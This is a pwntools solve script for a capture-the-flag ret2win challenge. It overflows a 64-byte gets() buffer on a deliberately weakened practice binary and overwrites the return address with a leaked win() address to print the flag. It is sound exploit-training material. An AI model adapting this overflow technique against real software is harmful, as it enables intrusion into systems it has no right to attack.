#!/usr/bin/env python3
"""
Solve script for the L3m0n PWN Buffer Overflow challenge.
This is a classic ret2win challenge.
"""

from pwn import *

# Context for better debugging
context.update(arch='amd64', os='linux')
# context.log_level = 'debug'  # Uncomment for verbose output

def exploit(host='localhost', port=9000):
    """
    Exploit the buffer overflow to call win() function.
    
    Vulnerability:
    - gets() is used on a 64-byte buffer
    - No stack canary, NX disabled, no PIE
    - win() function address is leaked
    
    Strategy:
    - Overflow buffer (64 bytes) + saved RBP (8 bytes) + return address
    - Overwrite return address with win() address
    """
    
    # Connect to the challenge
    if host == 'localhost':
        io = remote(host, port)
    else:
        io = remote(host, port)
    
    # Receive the welcome message and parse win() address
    output = io.recvuntil(b'Enter your input: ')
    print(output.decode())
    
    # Parse the leaked win() address
    # Format: "Hint: The win() function is at 0x..."
    import re
    match = re.search(r'win\(\) function is at (0x[0-9a-f]+)', output.decode())
    if match:
        win_addr = int(match.group(1), 16)
        print(f"[+] Leaked win() address: {hex(win_addr)}")
    else:
        print("[-] Could not parse win() address, using default")
        win_addr = 0x401196  # Fallback address
    
    # Build the payload
    # Buffer: 64 bytes + saved RBP: 8 bytes + return address
    payload = b'A' * 64      # Fill buffer
    payload += b'B' * 8      # Overwrite saved RBP
    payload += p64(win_addr) # Overwrite return address with win()
    
    print(f"[+] Sending payload of {len(payload)} bytes...")
    io.sendline(payload)
    
    # Receive the flag
    try:
        response = io.recvall(timeout=2)
        print(response.decode())
    except:
        print(io.recv().decode())
    
    io.close()

if __name__ == '__main__':
    import sys
    if len(sys.argv) >= 3:
        exploit(sys.argv[1], int(sys.argv[2]))
    elif len(sys.argv) == 2:
        exploit('localhost', int(sys.argv[1]))
    else:
        exploit()
